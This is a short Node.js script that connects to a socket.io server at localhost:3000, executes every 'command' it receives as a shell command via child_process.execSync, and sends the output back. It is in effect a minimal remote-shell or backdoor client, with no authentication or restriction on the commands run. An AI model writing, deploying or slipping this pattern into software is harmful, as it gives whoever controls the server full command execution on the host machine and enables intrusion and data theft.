const cp = require('child_process');
const io = require('socket.io-client');
const socket = io.connect('http://localhost:3000');

socket.on('command', function (command) {
    const result = cp.execSync(command);
    socket.emit('result', result.toString());
});


